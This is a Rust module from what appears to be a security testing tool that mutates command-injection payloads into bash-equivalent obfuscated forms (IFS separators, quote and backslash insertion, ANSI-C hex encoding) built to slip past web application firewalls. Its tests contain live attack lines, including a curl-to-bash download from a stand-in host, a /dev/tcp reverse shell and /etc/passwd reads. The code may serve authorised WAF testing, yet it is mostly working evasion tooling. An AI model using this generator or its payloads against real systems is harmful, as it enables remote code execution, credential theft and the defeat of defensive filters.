//! Command-injection payload-string equivalence + the joint
//! `(payload × delivery)` generator — the cmdi arm of Phase B.
//!
//! Every rewrite is shell-parser-equivalent *by construction* (bash
//! resolves `c''at`, `c\at`, `${IFS}` to the exact same execution) and
//! every emitted member is re-verified ([`still_executes_cmd`]) to
//! still run the original command against its original target. Reuses
//! the `is_structured_cmd` chokepoint so a reverse shell / file-exfil
//! is never degraded to a bare `whoami` probe.

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};
use crate::grammar::cmd::is_structured_cmd;

/// Bash word-separator equivalents — every one field-splits to a
/// single argument boundary at execution.
// Bare `$IFS` is UNSOUND: `wget$IFShttp` parses as the variable
// `$IFShttp` (undefined → empty), losing the separator. Only the
// brace-delimited / parameter-expansion forms are unambiguous everywhere.
//
// ANSI-C-quoted whitespace `$'\x20'` / `$'\t'` is ALSO UNSOUND as a
// separator: `$'...'` is *quoting*, so the byte it yields is NOT subject
// to word-splitting. `cat$'\x20'etc/passwd` parses as the single command
// word `cat etc/passwd` (one token, no such binary) — proven against
// bash: `$'\x20'` field-splits to argc=1 while `${IFS}` gives argc=2.
// Only UNQUOTED expansions (`${IFS}`, `${IFS%??}`, raw space/tab) split.
const SEP_EQUIV: &[&str] = &[" ", "${IFS}", "\t", "${IFS%??}", "${IFS}${IFS}"];

fn sep_pick(rng: &mut Rng) -> String {
    (*rng.pick(SEP_EQUIV)).to_string()
}

/// Whitespace bytes a `$'…'` block can yield. They are QUOTED, so they do
/// NOT field-split — they glue to neighbours. Modelled as dropped (empty) so
/// the decoded word stays a single token (matching bash's word-splitting).
fn is_shell_ws_byte(v: u32) -> bool {
    matches!(v, 0x20 | 0x09 | 0x0a | 0x0b | 0x0c | 0x0d)
}

/// Decode bash ANSI-C `$'…'` quoting to the literal bytes bash produces.
///
/// Mirrors bash for the escapes the generator can emit (`\xHH`, `\nnn` octal,
/// and the standard C escapes `\t \n \r \\ \' \" \a \b \e \f \v \0`). The
/// `$'…'` wrapper is removed and the decoded bytes glue to adjacent text as a
/// single word. Whitespace bytes are dropped (quoted ⇒ non-splitting). Any
/// unknown escape is left literal, and an unterminated `$'…'` is passed
/// through verbatim — the oracle UNDER-approximates (fails closed → reject)
/// rather than over-claiming equivalence bash would not honour.
fn decode_ansi_c(s: &str) -> String {
    let b: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        // `$'` opens an ANSI-C block (NOT `${` parameter expansion).
        if b[i] == '$' && i + 1 < b.len() && b[i + 1] == '\'' {
            let mut j = i + 2;
            let mut decoded = String::new();
            let mut closed = false;
            while j < b.len() {
                if b[j] == '\'' {
                    closed = true;
                    j += 1;
                    break;
                }
                if b[j] == '\\' && j + 1 < b.len() {
                    let e = b[j + 1];
                    if e == 'x' {
                        // up to 2 hex digits
                        let mut k = j + 2;
                        let mut val: u32 = 0;
                        let mut n = 0;
                        while k < b.len() && n < 2 && b[k].is_ascii_hexdigit() {
                            val = val * 16 + b[k].to_digit(16).unwrap();
                            k += 1;
                            n += 1;
                        }
                        if n > 0 {
                            if !is_shell_ws_byte(val)
                                && let Some(c) = char::from_u32(val)
                            {
                                decoded.push(c);
                            }
                            j = k;
                            continue;
                        }
                        decoded.push('\\');
                        decoded.push('x');
                        j += 2;
                        continue;
                    }
                    if e.is_digit(8) {
                        // \nnn octal, up to 3 digits (bash also allows \0nnn)
                        let mut k = j + 1;
                        let mut val: u32 = 0;
                        let mut n = 0;
                        while k < b.len() && n < 3 && b[k].is_digit(8) {
                            val = val * 8 + b[k].to_digit(8).unwrap();
                            k += 1;
                            n += 1;
                        }
                        if !is_shell_ws_byte(val)
                            && let Some(c) = char::from_u32(val)
                        {
                            decoded.push(c);
                        }
                        j = k;
                        continue;
                    }
                    match e {
                        // whitespace-producing escapes ⇒ glue (drop)
                        't' | 'n' | 'r' | 'v' | 'f' => {}
                        '\\' => decoded.push('\\'),
                        '\'' => decoded.push('\''),
                        '"' => decoded.push('"'),
                        'a' | 'b' | 'e' | '0' => {} // non-printing ⇒ drop
                        other => decoded.push(other),
                    }
                    j += 2;
                    continue;
                }
                if !b[j].is_whitespace() {
                    decoded.push(b[j]);
                }
                j += 1;
            }
            if closed {
                out.push_str(&decoded);
                i = j;
                continue;
            }
            // unterminated `$'…'` — leave the rest literal (fail closed)
        }
        out.push(b[i]);
        i += 1;
    }
    out
}

/// Strip shell-transparent obfuscation so the candidate normalises
/// back to what actually executes (mirrors the WAF/shell view).
fn normalize(s: &str) -> String {
    // Decode bash ANSI-C `$'…'` quoting to the literal bytes it executes
    // FIRST — `$'\x63\x61\x74'` → `cat`, `c$'\x61't` → `cat`. The block is
    // QUOTED, so any whitespace byte it yields does NOT field-split: it glues
    // to its neighbours as one word. This both recovers the hidden verb/target
    // (recall) and rejects the unsound quoted-whitespace "separator"
    // (`cat$'\x20'etc/passwd` → glued `catetc/passwd`, fails verb survival —
    // exactly bash's one-non-existent-word behaviour). See [`decode_ansi_c`].
    let mut t = decode_ansi_c(s);
    // UNQUOTED expansions field-split → one argument boundary (a space).
    for ifs in ["${IFS%??}", "${IFS}${IFS}", "${IFS}", "$IFS"] {
        t = t.replace(ifs, " ");
    }
    // remove '' "" and backslash-before-ordinary (bash quote removal)
    let b: Vec<char> = t.chars().collect();
    let mut o = String::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if (b[i] == '\'' || b[i] == '"') && i + 1 < b.len() && b[i + 1] == b[i] {
            i += 2; // empty quote pair
            continue;
        }
        if b[i] == '\\' && i + 1 < b.len() && b[i + 1].is_ascii_alphanumeric() {
            o.push(b[i + 1]);
            i += 2;
            continue;
        }
        if b[i] == '$' && i + 1 < b.len() && b[i + 1] == '@' {
            i += 2; // $@ empty expansion
            continue;
        }
        o.push(b[i].to_ascii_lowercase());
        i += 1;
    }
    // §7 DEDUP + §1 SPEED: shared helper avoids the temporary Vec<&str>.
    super::collapse_whitespace(&o)
}

fn sig_tokens(norm: &str) -> Vec<String> {
    norm.split(|c: char| !c.is_ascii_alphanumeric() && c != '.' && c != '/' && c != '_')
        .filter(|t| t.len() >= 3)
        .map(str::to_string)
        .collect()
}

/// A shell-injection mechanism (separator / metachar / substitution)
/// or a structured effect. Without one the input is just prose, not a
/// command injection — the generator must emit nothing for it.
fn has_shell_context(s: &str) -> bool {
    if is_structured_cmd(s) {
        return true;
    }
    [
        ";", "|", "&", "`", "$(", "${", "\n", "\r", ">", "<", "%0a", "%0d", "$IFS",
    ]
    .iter()
    .any(|m| s.contains(m))
}

/// True iff `cand` provably still runs the original command + target.
#[must_use]
pub fn still_executes_cmd(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() || !has_shell_context(original) {
        return false;
    }
    // F109: anti-rig — if the original carried shell context (the
    // metacharacter that turns it into a command-injection rather
    // than a literal arg), the candidate MUST also carry shell
    // context. A future rewrite that strips every metacharacter
    // while preserving the token vocabulary would pass the
    // sig-token check below but produce a string that no longer
    // injects. Close the asymmetry.
    if !has_shell_context(cand) {
        return false;
    }
    let no = normalize(original);
    let nc = normalize(cand);
    if nc.is_empty() {
        return false;
    }
    if is_structured_cmd(original) {
        // The operator's command verb AND its target/host/effect must
        // survive (anti-rig: never substitute a bare probe). §7 DEDUP + §14:
        // whole-token survival via the shared boundary-aware matcher — the
        // prior `nc.contains(t)` substring check let a verb/target survive
        // buried in a larger token (`cat` in `category`, `id` in `void`),
        // which no longer runs the original command.
        let want = sig_tokens(&no);
        if want.is_empty() {
            return true;
        }
        want.iter().all(|t| super::contains_token(&nc, t))
    } else {
        // Bare exec probe: the command VERB must survive as a whole token.
        // Skip any leading shell separators/whitespace first — for `; cat …`
        // the verb is `cat`, not `;`. The prior `split_whitespace().next()`
        // grabbed the separator, so a probe substitution (`; cat etc/passwd`
        // → `; whoami`) rode in on the surviving `;` and was wrongly
        // certified. Anchoring on the real verb closes that anti-rig hole.
        let first = no
            .split(|c: char| c.is_whitespace() || c == ';' || c == '|' || c == '&')
            .find(|t| !t.is_empty())
            .unwrap_or("");
        !first.is_empty() && super::contains_token(&nc, first)
    }
}

// ── rewrites (bash-equivalent) ─────────────────────────────────────

/// Replace inter-token spaces with field-split equivalents.
fn rw_sep(s: &str, rng: &mut Rng) -> String {
    let mut out = String::with_capacity(s.len() + 8);
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == ' ' {
            // collapse a run of spaces → one equivalent separator
            while chars.peek() == Some(&' ') {
                chars.next();
            }
            out.push_str(&sep_pick(rng));
        } else {
            out.push(c);
        }
    }
    out
}

/// Obfuscate the FIRST command word with a bash-transparent form
/// (quote/backslash/`$@` insertion) — same binary resolved.
fn rw_cmd_obf(s: &str, rng: &mut Rng) -> Option<String> {
    let trimmed_start = s.len() - s.trim_start().len();
    let rest = &s[trimmed_start..];
    // command word = leading run of [A-Za-z0-9_/.-] (skip a leading
    // separator like ';' '|' '&').
    let bytes = rest.as_bytes();
    let mut i = 0;
    while i < bytes.len()
        && (bytes[i] == b';'
            || bytes[i] == b'|'
            || bytes[i] == b'&'
            || bytes[i] == b' '
            || bytes[i] == b'\n')
    {
        i += 1;
    }
    let st = i;
    while i < bytes.len()
        && (bytes[i].is_ascii_alphanumeric()
            || bytes[i] == b'/'
            || bytes[i] == b'.'
            || bytes[i] == b'-'
            || bytes[i] == b'_')
    {
        i += 1;
    }
    if i - st < 2 {
        return None;
    }
    let word = &rest[st..i];
    // Defensive (per perf-hunt N03): the inner while loop only
    // advances `i` past ASCII-only bytes (`is_ascii_alphanumeric` plus
    // a small ASCII punctuation set), so `word` is guaranteed ASCII
    // and `split_at(cut)` is byte-safe. If a future change to the
    // char class in the loop above ever admits a multi-byte
    // codepoint, `split_at` on a non-char-boundary would panic — make
    // the invariant explicit.
    debug_assert!(word.is_ascii(), "cmd-shell word slice must be ASCII");
    let cut = 1 + rng.below(word.len() - 1);
    let (l, r) = word.split_at(cut);
    let obf = match rng.below(4) {
        0 => format!("{l}''{r}"),
        1 => format!("{l}\\{r}"),
        2 => format!("{l}\"\"{r}"),
        _ => format!("{l}$@{r}"),
    };
    let mut out = String::with_capacity(s.len() + 4);
    out.push_str(&s[..trimmed_start]);
    out.push_str(&rest[..st]);
    out.push_str(&obf);
    out.push_str(&rest[i..]);
    Some(out)
}

/// Obfuscate one alnum word with MULTIPLE bash-quote-removal-transparent
/// insertions (`''`, `""`, `$@`, or `\` before the char). Every form is
/// reversed by [`normalize`]; because the word is a pure `[A-Za-z0-9]`
/// run, a `\` always precedes an alnum char (the only case `normalize`
/// strips) — so every insertion is sound regardless of position.
fn obf_word(word: &str, rng: &mut Rng) -> String {
    let cs: Vec<char> = word.chars().collect();
    let mut out = String::with_capacity(word.len() * 3);
    for (idx, &c) in cs.iter().enumerate() {
        // Insert before this char. Rarely before the very first char (so
        // the token usually starts clean), commonly between chars.
        if (idx > 0 || rng.chance(1, 3)) && rng.chance(1, 2) {
            match rng.below(4) {
                0 => out.push_str("''"),
                1 => out.push_str("\"\""),
                2 => out.push_str("$@"),
                _ => out.push('\\'), // c is alnum ⇒ bash strips the `\`
            }
        }
        out.push(c);
    }
    out
}

/// Obfuscate the PLAIN command words — every `[A-Za-z0-9]` run at shell
/// TOP LEVEL — with [`obf_word`]. Runs inside a `${…}` / `$(…)` are
/// skipped: bash's own parser rejects a quote/backslash inside a
/// parameter name (`${I''FS}` is a syntax error), so `normalize` could
/// "accept" a string bash would never run — the one way string-level
/// equivalence diverges from execution. Tracking `$`-construct depth and
/// only rewriting at depth 0 keeps every emitted form genuinely
/// executable; `still_executes_cmd` is the final backstop.
///
/// Unlike [`rw_cmd_obf`] (first word, single cut) this also hides the
/// TARGET — `/etc/pa''ss''wd`, `\b\i\n/sh` — defeating WAF rules keyed on
/// `/etc/passwd`, `/bin/sh`, and friends, which the first-word-only
/// rewrite always shipped in cleartext.
fn rw_token_obf(payload: &str, rng: &mut Rng) -> Option<String> {
    let chars: Vec<char> = payload.chars().collect();
    let mut out = String::with_capacity(payload.len() * 2);
    let mut stack: Vec<char> = Vec::new(); // expected `$`-construct closers
    let mut changed = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        // enter `${` / `$(`
        if c == '$' && i + 1 < chars.len() && (chars[i + 1] == '{' || chars[i + 1] == '(') {
            stack.push(if chars[i + 1] == '{' { '}' } else { ')' });
            out.push(c);
            out.push(chars[i + 1]);
            i += 2;
            continue;
        }
        if stack.last() == Some(&c) {
            stack.pop();
            out.push(c);
            i += 1;
            continue;
        }
        if stack.is_empty() && c.is_ascii_alphanumeric() {
            let start = i;
            while i < chars.len() && chars[i].is_ascii_alphanumeric() {
                i += 1;
            }
            let word: String = chars[start..i].iter().collect();
            if word.len() >= 2 && rng.chance(3, 4) {
                let obf = obf_word(&word, rng);
                if obf != word {
                    changed = true;
                }
                out.push_str(&obf);
            } else {
                out.push_str(&word);
            }
            continue;
        }
        out.push(c);
        i += 1;
    }
    changed.then_some(out)
}

/// Hex-encode whole TOP-LEVEL alnum words as bash ANSI-C strings:
/// `cat` → `$'\x63\x61\x74'`, `passwd` → `$'\x70\x61\x73\x73\x77\x64'`. Each
/// `$'…'` block is one quoted word that bash decodes at parse time and glues
/// to its literal neighbours (`/`, `.`, `-`), so `/etc/passwd` becomes
/// `/$'\x65\x74\x63'/$'\x70\x61\x73\x73\x77\x64'` — the same path, with the
/// cleartext tokens `etc`/`passwd` gone from the wire. Strictly stronger than
/// quote-insertion (which leaves the letters visible).
///
/// Runs at `$`-construct depth 0 ONLY (a backslash/quote inside `${IFS}` is a
/// bash syntax error); [`normalize`]'s [`decode_ansi_c`] reverses every form
/// and `still_executes_cmd` is the final backstop.
fn rw_ansi_c(payload: &str, rng: &mut Rng) -> Option<String> {
    let chars: Vec<char> = payload.chars().collect();
    let mut out = String::with_capacity(payload.len() * 4);
    let mut stack: Vec<char> = Vec::new();
    let mut changed = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '$' && i + 1 < chars.len() && (chars[i + 1] == '{' || chars[i + 1] == '(') {
            stack.push(if chars[i + 1] == '{' { '}' } else { ')' });
            out.push(c);
            out.push(chars[i + 1]);
            i += 2;
            continue;
        }
        if stack.last() == Some(&c) {
            stack.pop();
            out.push(c);
            i += 1;
            continue;
        }
        if stack.is_empty() && c.is_ascii_alphanumeric() {
            let start = i;
            while i < chars.len() && chars[i].is_ascii_alphanumeric() {
                i += 1;
            }
            let word: String = chars[start..i].iter().collect();
            // Encode words long enough to carry a WAF signature; sometimes
            // leave one alone so output keeps shape diversity across seeds.
            if word.len() >= 2 && rng.chance(2, 3) {
                out.push_str("$'");
                for ch in word.chars() {
                    out.push_str(&format!("\\x{:02x}", ch as u32));
                }
                out.push('\'');
                changed = true;
            } else {
                out.push_str(&word);
            }
            continue;
        }
        out.push(c);
        i += 1;
    }
    changed.then_some(out)
}

/// `;` ↔ newline are unconditionally-equivalent statement separators
/// (NOT `&&`/`||` — those are conditional). Swap a leading `;`.
fn rw_separator(s: &str, rng: &mut Rng) -> Option<String> {
    let t = s.trim_start();
    let lead = s.len() - t.len();
    if let Some(rest) = t.strip_prefix(';') {
        let repl = if rng.chance(1, 2) { "\n" } else { "%0a" };
        return Some(format!("{}{repl}{rest}", &s[..lead]));
    }
    None
}

// ── generator ──────────────────────────────────────────────────────

#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::with_capacity(cfg.max);

    if !still_executes_cmd(payload, payload) {
        return out;
    }

    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    let mut attempts = 0;
    while out.len() < cfg.max
        && attempts < cfg.max * super::ATTEMPT_BUDGET_MULTIPLIER + super::ATTEMPT_BUDGET_FLOOR
    {
        attempts += 1;
        let mut s = payload.to_string();
        let mut rules: Vec<&'static str> = Vec::with_capacity(8);
        if rng.chance(4, 5) {
            let n = rw_sep(&s, &mut rng);
            if n != s {
                s = n;
                rules.push("ifs_sep");
            }
        }
        if rng.chance(3, 5)
            && let Some(n) = rw_cmd_obf(&s, &mut rng)
        {
            s = n;
            rules.push("cmd_obfuscate");
        }
        // Multi-position, all-words obfuscation — hides the target too.
        if rng.chance(3, 5)
            && let Some(n) = rw_token_obf(&s, &mut rng)
        {
            s = n;
            rules.push("cmd_token_obfuscate");
        }
        // ANSI-C hex-encode whole words — removes the cleartext verb/target
        // tokens entirely (`cat`/`passwd` → `$'\x…'`). Mutually exclusive
        // with token-obf on a given pass so the two never fight over a word.
        else if rng.chance(2, 5)
            && let Some(n) = rw_ansi_c(&s, &mut rng)
        {
            s = n;
            rules.push("cmd_ansi_c");
        }
        if rng.chance(1, 3)
            && let Some(n) = rw_separator(&s, &mut rng)
        {
            s = n;
            rules.push("separator_equiv");
        }
        if rules.is_empty() {
            continue;
        }
        if !still_executes_cmd(payload, &s) {
            continue;
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        crate::grammar::equiv::test_cfg(seed, 48, "q")
    }

    #[test]
    fn structured_attack_keeps_command_and_target() {
        let atk = "; curl http://evil.tld/s|bash";
        let v = generate(atk, &cfg(5));
        assert!(!v.is_empty());
        for m in &v {
            assert!(
                still_executes_cmd(atk, &m.payload),
                "unsound {:?}",
                m.payload
            );
            let nc = normalize(&m.payload);
            assert!(
                nc.contains("curl") && nc.contains("evil.tld"),
                "lost command/target: {:?}",
                m.payload
            );
        }
    }

    #[test]
    fn ifs_and_quote_obfuscation_normalize_back() {
        assert_eq!(normalize("c''a\\t${IFS}/etc/passwd"), "cat /etc/passwd");
        assert!(still_executes_cmd(
            "; cat /etc/passwd",
            "; c''at${IFS}/etc/passwd"
        ));
    }

    #[test]
    fn target_obfuscation_normalizes_back_and_stays_equivalent() {
        // The TARGET hidden behind quote/backslash insertions still resolves
        // to the same file — the new capability the first-word rewrite lacked.
        for v in [
            "; cat /etc/pa''ss''wd",
            "; cat /etc/pa\\ss\\wd",
            "; cat /e\"\"tc/passwd",
            "; c''at /etc/pa$@ss''wd",
        ] {
            assert!(
                still_executes_cmd("; cat /etc/passwd", v),
                "target-obf not equiv: {v}"
            );
            assert!(
                normalize(v).contains("/etc/passwd"),
                "target lost under normalize: {v}"
            );
        }
    }

    #[test]
    fn token_obf_never_touches_parameter_expansion() {
        // SOUNDNESS: a quote/backslash inside `${IFS}` is a bash syntax error,
        // so rw_token_obf must leave every `$`-construct byte-identical. Across
        // many seeds the `${IFS}` separator survives verbatim and the result
        // still executes the original command.
        let atk = "; cat${IFS}/etc/passwd";
        for seed in 0..64u64 {
            let mut rng = Rng::new(seed);
            if let Some(out) = rw_token_obf(atk, &mut rng) {
                assert!(
                    out.contains("${IFS}"),
                    "parameter expansion was mangled (seed {seed}): {out}"
                );
                assert!(
                    still_executes_cmd(atk, &out),
                    "unsound token-obf (seed {seed}): {out}"
                );
            }
        }
    }

    #[test]
    fn generator_now_hides_the_target() {
        // Capability proof: across seeds the generator emits at least one sound
        // variant tagged `cmd_token_obfuscate` whose RAW form no longer carries
        // the cleartext target token `passwd`, while normalize still recovers
        // `/etc/passwd`. Pre-fix only the first command word was ever hidden.
        let atk = "; cat /etc/passwd";
        let mut hidden_target = false;
        let mut tagged = false;
        for seed in 0..60u64 {
            for m in generate(atk, &cfg(seed)) {
                assert!(
                    still_executes_cmd(atk, &m.payload),
                    "UNSOUND {:?}",
                    m.payload
                );
                if m.rules.contains(&"cmd_token_obfuscate") {
                    tagged = true;
                    if !m.payload.contains("passwd") {
                        hidden_target = true;
                    }
                }
            }
            if hidden_target && tagged {
                break;
            }
        }
        assert!(tagged, "no variant tagged cmd_token_obfuscate");
        assert!(
            hidden_target,
            "generator never hid the cleartext target token"
        );
    }

    #[test]
    fn never_substitutes_a_bare_probe_for_a_reverse_shell() {
        let atk = "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        for m in generate(atk, &cfg(11)) {
            assert!(m.payload != "whoami" && m.payload != "id");
            let nc = normalize(&m.payload);
            assert!(nc.contains("/dev/tcp") && nc.contains("10.0.0.1"));
        }
    }

    #[test]
    fn ansi_c_quoted_whitespace_is_rejected_not_a_separator() {
        // SOUNDNESS (proven against bash): `$'\x20'` / `$'\t'` are *quoted*
        // bytes — they do NOT field-split. `cat$'\x20'etc/passwd` parses as
        // the single command word `cat etc/passwd` (argc=1, no such binary),
        // whereas `${IFS}` yields argc=2. The oracle must therefore REJECT
        // the quoted-whitespace "separator" while still accepting `${IFS}`.
        assert!(
            !still_executes_cmd("; cat etc/passwd", "; cat$'\\x20'etc/passwd"),
            "quoted-space glue must not be certified as a field separator"
        );
        assert!(
            !still_executes_cmd("; cat etc/passwd", "; cat$'\\t'etc/passwd"),
            "quoted-tab glue must not be certified as a field separator"
        );
        // The genuine, unquoted IFS separator stays sound.
        assert!(still_executes_cmd(
            "; cat etc/passwd",
            "; cat${IFS}etc/passwd"
        ));
    }

    #[test]
    fn generator_never_emits_quoted_whitespace_separator() {
        // The generator must never ship `$'\x20'` / `$'\t'` — bash would not
        // field-split them, so they break the very command they claim to
        // carry. Sweep many seeds and a multi-arg attack to exercise rw_sep.
        let atk = "; cat /etc/passwd /tmp/x";
        for seed in 0..128u64 {
            for m in generate(atk, &cfg(seed)) {
                assert!(
                    !m.payload.contains("$'\\x20'") && !m.payload.contains("$'\\t'"),
                    "emitted unsound quoted-whitespace separator (seed {seed}): {:?}",
                    m.payload
                );
                // Whatever it emitted must still truly execute.
                assert!(
                    still_executes_cmd(atk, &m.payload),
                    "UNSOUND: {:?}",
                    m.payload
                );
            }
        }
    }

    #[test]
    fn ansi_c_hex_decodes_back_to_command() {
        // Full-word and partial-concat ANSI-C forms recover the verb/target.
        assert_eq!(decode_ansi_c("$'\\x63\\x61\\x74'"), "cat");
        assert_eq!(decode_ansi_c("c$'\\x61't"), "cat");
        assert_eq!(
            decode_ansi_c("/$'\\x65\\x74\\x63'/$'\\x70\\x61\\x73\\x73\\x77\\x64'"),
            "/etc/passwd"
        );
        // Octal form bash also honours.
        assert_eq!(decode_ansi_c("$'\\143\\141\\164'"), "cat");
        // Unterminated block passed through (fail closed, not decoded).
        assert_eq!(decode_ansi_c("$'\\x63\\x61"), "$'\\x63\\x61");
    }

    #[test]
    fn ansi_c_encoded_attack_is_sound_and_hides_cleartext() {
        // The verb AND target encoded as hex still execute the original.
        let atk = "; cat /etc/passwd";
        let enc = "; $'\\x63\\x61\\x74'${IFS}/$'\\x65\\x74\\x63'/$'\\x70\\x61\\x73\\x73\\x77\\x64'";
        assert!(
            still_executes_cmd(atk, enc),
            "ANSI-C encoded form not certified sound"
        );
        // Cleartext WAF tokens are gone from the raw payload …
        assert!(!enc.contains("cat") && !enc.contains("passwd"));
        // … yet normalize recovers them.
        let n = normalize(enc);
        assert!(
            n.contains("cat") && n.contains("/etc/passwd"),
            "normalize lost target: {n}"
        );
    }

    #[test]
    fn generator_emits_sound_ansi_c_variant() {
        // Capability proof: across seeds the generator ships at least one
        // sound `cmd_ansi_c` variant whose RAW form no longer carries the
        // cleartext `passwd`, while it still truly executes the original.
        let atk = "; cat /etc/passwd";
        let mut hid = false;
        let mut tagged = false;
        for seed in 0..80u64 {
            for m in generate(atk, &cfg(seed)) {
                assert!(
                    still_executes_cmd(atk, &m.payload),
                    "UNSOUND {:?}",
                    m.payload
                );
                if m.rules.contains(&"cmd_ansi_c") {
                    tagged = true;
                    if !m.payload.contains("passwd") {
                        hid = true;
                    }
                }
            }
            if hid && tagged {
                break;
            }
        }
        assert!(tagged, "no variant tagged cmd_ansi_c");
        assert!(
            hid,
            "ANSI-C variant never removed the cleartext target token"
        );
    }

    #[test]
    fn bare_probe_substitution_is_rejected() {
        // ANTI-RIG: a non-structured injection (`; cat etc/passwd`) must not
        // certify a candidate that swaps the verb for a bare probe. The verb
        // `cat` has to survive as a whole token — a surviving leading `;` is
        // not enough. (Regression for the verb-extraction grabbing `;`.)
        assert!(!still_executes_cmd("; cat etc/passwd", "; whoami"));
        assert!(!still_executes_cmd("; cat etc/passwd", "; id"));
        assert!(!still_executes_cmd("| nslookup x", "| whoami"));
        // The genuine same-command rewrite still passes.
        assert!(still_executes_cmd("; cat etc/passwd", "; c''at etc/passwd"));
    }

    #[test]
    fn non_cmd_and_empty_emit_nothing() {
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("the quick brown fox", &cfg(1)).is_empty());
    }

    #[test]
    fn deterministic_per_seed() {
        let a: Vec<_> = generate("; cat /etc/passwd", &cfg(4))
            .into_iter()
            .map(|m| (m.payload, m.delivery.label()))
            .collect();
        let b: Vec<_> = generate("; cat /etc/passwd", &cfg(4))
            .into_iter()
            .map(|m| (m.payload, m.delivery.label()))
            .collect();
        assert_eq!(a, b);
    }

    #[test]
    fn diverse_equivalents_produced() {
        let v = generate("; cat /etc/passwd", &cfg(8));
        let d: std::collections::HashSet<_> = v.iter().map(|m| &m.payload).collect();
        assert!(d.len() >= 6, "too few distinct: {}", d.len());
    }
}
